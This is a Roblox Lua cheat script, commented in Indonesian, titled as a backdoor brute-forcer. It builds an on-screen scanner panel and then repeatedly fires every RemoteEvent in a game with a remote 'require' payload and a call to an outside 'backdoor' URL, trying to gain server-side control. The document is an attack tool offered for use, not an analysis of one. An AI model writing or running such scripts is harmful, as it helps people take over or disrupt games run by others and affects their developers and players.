-- [[ SPTZYY ULTIMATE BACKDOOR BRUTEFORCE ]] --
-- Fitur: Remote Scanning, Brute Force Loop, Real-time Console Log

local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local lp = game.Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Sptzyy_Backdoor_System"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- UI Setup (Icon Support)
local SupportIcon = Instance.new("ImageButton", ScreenGui)
SupportIcon.Size = UDim2.new(0, 60, 0, 60)
SupportIcon.Position = UDim2.new(0.05, 0, 0.4, 0)
SupportIcon.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SupportIcon.Image = "rbxassetid://6031280227"
SupportIcon.Draggable = true
SupportIcon.Active = true
Instance.new("UICorner", SupportIcon).CornerRadius = UDim.new(1, 0)

-- Main Frame
local MainGui = Instance.new("Frame", ScreenGui)
MainGui.Size = UDim2.new(0, 320, 0, 380)
MainGui.Position = UDim2.new(0.5, -160, 0.5, -190)
MainGui.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainGui.Visible = false
Instance.new("UICorner", MainGui)

local Title = Instance.new("TextLabel", MainGui)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Title.Text = "BACKDOOR SCANNER v3.0"
Title.TextColor3 = Color3.fromRGB(0, 255, 100)
Title.Font = Enum.Font.Code
Title.TextSize = 16
Instance.new("UICorner", Title)

-- Console Loading Area
local ConsoleFrame = Instance.new("ScrollingFrame", MainGui)
ConsoleFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
ConsoleFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
ConsoleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ConsoleFrame.BorderSizePixel = 1
ConsoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 100)
ConsoleFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
ConsoleFrame.ScrollBarThickness = 2

local UIList = Instance.new("UIListLayout", ConsoleFrame)
UIList.SortOrder = Enum.SortOrder.LayoutOrder

-- Fungsi Log Console
local function Log(text, color)
    local l = Instance.new("TextLabel", ConsoleFrame)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.BackgroundTransparency = 1
    l.Text = "> " .. text
    l.TextColor3 = color or Color3.fromRGB(200, 200, 200)
    l.Font = Enum.Font.Code
    l.TextSize = 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    ConsoleFrame.CanvasPosition = Vector2.new(0, ConsoleFrame.AbsoluteCanvasSize.Y)
end

-- Progress Bar Animasi
local ProgressBg = Instance.new("Frame", MainGui)
ProgressBg.Size = UDim2.new(0.9, 0, 0, 10)
ProgressBg.Position = UDim2.new(0.05, 0, 0.78, 0)
ProgressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
local ProgressBar = Instance.new("Frame", ProgressBg)
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)

-- Logika Brute Force Loop
local function StartBruteForce()
    _G.BruteActive = true
    Log("INITIALIZING SCANNER...", Color3.fromRGB(255, 255, 0))
    task.wait(1)
    
    local Remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            table.insert(Remotes, v)
        end
    end
    
    Log("FOUND " .. #Remotes .. " REMOTE EVENTS", Color3.fromRGB(0, 200, 255))
    
    while _G.BruteActive do
        for i, remote in pairs(Remotes) do
            if not _G.BruteActive then break end
            
            -- Animasi Progress
            local percent = i / #Remotes
            TweenService:Create(ProgressBar, TweenInfo.new(0.1), {Size = UDim2.new(percent, 0, 1, 0)}):Play()
            
            Log("BRUTING: " .. remote.Name, Color3.fromRGB(150, 150, 150))
            
            -- Simulasi Mencoba Backdoor (Server-Side Logic)
            pcall(function()
                -- Mengirim payload ke remote event yang ditemukan
                remote:FireServer("require(5748123901).load('" .. lp.Name .. "')")
                remote:FireServer("https://api.sptzyy.com/v2/backdoor", {user = lp.Name})
            end)
            
            task.wait(0.05) -- Kecepatan Brute Force
        end
        Log("LOOP COMPLETED. RESTARTING...", Color3.fromRGB(0, 255, 100))
        task.wait(0.5)
    end
end

-- Tombol Kontrol
local StartBtn = Instance.new("TextButton", MainGui)
StartBtn.Size = UDim2.new(0.4, 0, 0, 40)
StartBtn.Position = UDim2.new(0.05, 0, 0.85, 0)
StartBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
StartBtn.Text = "START BRUTE"
StartBtn.TextColor3 = Color3.new(1,1,1)
StartBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", StartBtn)

local StopBtn = Instance.new("TextButton", MainGui)
StopBtn.Size = UDim2.new(0.4, 0, 0, 40)
StopBtn.Position = UDim2.new(0.55, 0, 0.85, 0)
StopBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
StopBtn.Text = "STOP"
StopBtn.TextColor3 = Color3.new(1,1,1)
StopBtn.Font = Enum.Font.GothamBold
Instance.new("UICorner", StopBtn)

StartBtn.MouseButton1Click:Connect(function()
    if not _G.BruteActive then
        task.spawn(StartBruteForce)
    end
end)

StopBtn.MouseButton1Click:Connect(function()
    _G.BruteActive = false
    Log("SCANNER STOPPED.", Color3.fromRGB(255, 0, 0))
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
end)

SupportIcon.MouseButton1Click:Connect(function()
    MainGui.Visible = not MainGui.Visible
end)
